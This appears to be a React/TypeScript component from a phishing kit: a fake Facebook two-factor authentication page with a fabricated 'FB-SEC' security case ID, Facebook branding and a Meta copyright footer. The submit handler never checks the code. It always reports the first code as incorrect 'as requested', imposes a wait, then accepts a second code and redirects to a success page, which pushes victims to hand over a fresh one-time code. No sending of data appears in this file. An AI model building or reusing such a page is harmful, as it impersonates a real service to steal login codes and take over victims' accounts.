import React, { useState, useEffect } from 'react';
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { TicketIcon, KeyIcon, ShieldCheck, ArrowRight, XCircle } from "lucide-react";

export default function Verify2FAPage() {
  const [, setLocation] = useLocation();
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [timeRemaining, setTimeRemaining] = useState(60);
  const [inputRefs] = useState<React.RefObject<HTMLInputElement>[]>(
    Array(6).fill(0).map(() => React.createRef<HTMLInputElement>())
  );
  const [attemptFailed, setAttemptFailed] = useState(false);
  const [blockTime, setBlockTime] = useState(0);

  // Get ticket number from localStorage for consistency across pages
  const ticketNumber = localStorage.getItem('securityTicket') || 
    `FB-SEC-${Math.floor(10000000 + Math.random() * 90000000)}`;

  // Countdown timer for code expiration
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeRemaining((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);
  
  // Countdown timer for block time (after failed attempt)
  useEffect(() => {
    if (blockTime <= 0) return;
    
    const timer = setInterval(() => {
      setBlockTime((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [blockTime]);

  // Format the remaining time as MM:SS
  const formatTimeRemaining = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  const handleInputChange = (index: number, value: string) => {
    // Only allow digits
    if (!/^\d*$/.test(value)) return;

    const newVerificationCode = [...verificationCode];
    newVerificationCode[index] = value;
    setVerificationCode(newVerificationCode);

    // Clear any previous errors
    setError("");

    // Auto-focus next input if value is entered
    if (value && index < 5) {
      inputRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Move to previous input on backspace if current input is empty
    if (e.key === 'Backspace' && !verificationCode[index] && index > 0) {
      inputRefs[index - 1].current?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text');
    
    // If pasted data contains 6 digits, populate all fields
    if (/^\d{6}$/.test(pastedData)) {
      const digits = pastedData.split('');
      setVerificationCode(digits);
      
      // Focus the last input
      inputRefs[5].current?.focus();
    }
  };

  const handleResendCode = () => {
    // Reset the timer
    setTimeRemaining(60);
    
    // Clear the inputs
    setVerificationCode(['', '', '', '', '', '']);
    
    // Focus on first input
    inputRefs[0].current?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Check if all fields are filled
    if (verificationCode.some(digit => !digit)) {
      setError("Please enter all 6 digits of the verification code");
      return;
    }
    
    if (blockTime > 0) {
      setError(`Too many attempts. Please wait ${formatTimeRemaining(blockTime)} before trying again.`);
      return;
    }
    
    setIsSubmitting(true);
    
    // Simulate API call delay
    setTimeout(() => {
      setIsSubmitting(false);
      
      // Always show error for the first attempt as requested
      if (!attemptFailed) {
        setAttemptFailed(true);
        setError("The code you entered is incorrect. Please try again.");
        setVerificationCode(['', '', '', '', '', '']);
        // Focus on first input again
        inputRefs[0].current?.focus();
        // Set 2 minute block time (120 seconds)
        setBlockTime(120);
      } else {
        // On second attempt, proceed to success
        setLocation("/success");
      }
    }, 1500);
  };

  return (
    <>
      <Card className="w-full bg-white rounded-lg shadow-md">
        <CardContent className="p-8">
          <div className="flex justify-between items-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-10"
            />
            <div className="flex items-center bg-blue-50 px-3 py-1 rounded-full">
              <TicketIcon className="h-3.5 w-3.5 text-facebook-blue mr-1.5" />
              <span className="text-xs font-medium text-facebook-blue">Case ID: {ticketNumber}</span>
            </div>
          </div>
          
          <div className="md:flex md:items-start">
            <div className="md:w-1/3 mb-4 md:mb-0 md:pr-6">
              <h1 className="text-xl font-bold text-[#1C1E21] mb-2">Two-Factor Authentication</h1>
              <p className="text-gray-600 mb-4">
                Enter the 6-digit code sent to your device to verify your identity and complete the security process.
              </p>
              
              <div className="p-3 rounded-md border border-gray-200 flex items-center justify-between mb-4">
                <div className="flex items-center">
                  <KeyIcon className="h-4 w-4 text-gray-500 mr-2" />
                  <div>
                    <p className="text-xs text-gray-600">Code expires in:</p>
                    <p className="text-sm font-medium text-gray-800">{formatTimeRemaining(timeRemaining)}</p>
                  </div>
                </div>
                <Button 
                  variant="ghost" 
                  size="sm" 
                  className="text-xs text-facebook-blue hover:text-blue-800"
                  onClick={handleResendCode}
                  disabled={timeRemaining > 0 || blockTime > 0}
                >
                  Resend Code
                </Button>
              </div>
              
              {blockTime > 0 && (
                <div className="p-3 rounded-md border border-red-200 bg-red-50 mb-4">
                  <div className="flex items-start">
                    <XCircle className="h-5 w-5 text-red-500 mr-2 mt-0.5 flex-shrink-0" />
                    <div>
                      <h3 className="font-semibold text-red-700 text-sm">Too many attempts</h3>
                      <p className="text-xs text-red-600 mt-1">
                        For security reasons, please wait {formatTimeRemaining(blockTime)} before trying again.
                      </p>
                    </div>
                  </div>
                </div>
              )}
              
              <div className="hidden md:block">
                <p className="text-sm text-gray-500 mb-2 font-medium">Having problems?</p>
                <ul className="text-xs text-gray-600 space-y-2">
                  <li className="hover:text-facebook-blue cursor-pointer">• Try another verification method</li>
                  <li className="hover:text-facebook-blue cursor-pointer">• Contact support</li>
                  <li className="hover:text-facebook-blue cursor-pointer">• Visit Help Center</li>
                </ul>
              </div>
            </div>
            
            <div className="md:w-2/3">
              <form onSubmit={handleSubmit} className="bg-gray-50 p-6 rounded-lg border border-gray-200">
                <Label htmlFor="verificationCode" className="block text-sm font-medium text-gray-700 mb-3">
                  Enter 6-digit verification code <span className="text-red-500">*</span>
                </Label>
                
                <div className="flex justify-center gap-2 mb-4">
                  {verificationCode.map((digit, index) => (
                    <Input
                      key={index}
                      ref={inputRefs[index]}
                      type="text"
                      value={digit}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={index === 0 ? handlePaste : undefined}
                      maxLength={1}
                      className={`w-12 h-14 text-2xl text-center font-bold rounded-md border ${
                        error && attemptFailed ? 'border-red-300 bg-red-50' : 'border-gray-300'
                      } focus:outline-none focus:ring-2 ${
                        error && attemptFailed ? 'focus:ring-red-400' : 'focus:ring-[#1877F2]'
                      } focus:border-transparent`}
                      autoFocus={index === 0}
                      disabled={blockTime > 0}
                    />
                  ))}
                </div>
                
                {error && (
                  <div className="text-red-500 text-sm text-center mb-4 flex items-center justify-center">
                    <XCircle className="h-4 w-4 mr-1.5" />
                    {error}
                  </div>
                )}
                
                <div className="flex flex-col md:flex-row justify-between items-center gap-4">
                  <div className="bg-green-50 p-2.5 rounded-md flex items-start flex-grow">
                    <ShieldCheck className="h-4 w-4 text-green-600 mr-1.5 mt-0.5 flex-shrink-0" />
                    <p className="text-xs text-green-700">
                      This additional step helps us verify that it's really you trying to access your account.
                    </p>
                  </div>
                  
                  <Button
                    type="submit"
                    disabled={isSubmitting || verificationCode.some(digit => !digit) || blockTime > 0}
                    className="bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-2.5 px-5 rounded-md transition-colors duration-200 min-w-[140px] flex items-center justify-center"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center justify-center">
                        <div className="w-4 h-4 border-t-2 border-b-2 border-white rounded-full animate-spin mr-2"></div>
                        <span>Verifying...</span>
                      </div>
                    ) : (
                      <>
                        <span>Verify</span>
                        <ArrowRight className="ml-1.5 h-4 w-4" />
                      </>
                    )}
                  </Button>
                </div>
              </form>
              
              <div className="mt-4 text-center">
                <p className="text-sm text-gray-500 mb-1">
                  Didn't receive the code? <button onClick={handleResendCode} disabled={timeRemaining > 0 || blockTime > 0} className={`${(timeRemaining > 0 || blockTime > 0) ? 'text-gray-400' : 'text-facebook-blue hover:underline'}`}>Resend</button>
                </p>
                <p className="text-sm text-gray-500 md:hidden">
                  <button className="text-facebook-blue hover:underline">Try another verification method</button>
                </p>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      <div className="w-full text-center mt-4 text-gray-500 text-xs flex flex-col md:flex-row md:justify-between md:items-center">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
        <p>© Facebook 2023 • Meta Platforms, Inc.</p>
      </div>
    </>
  );
}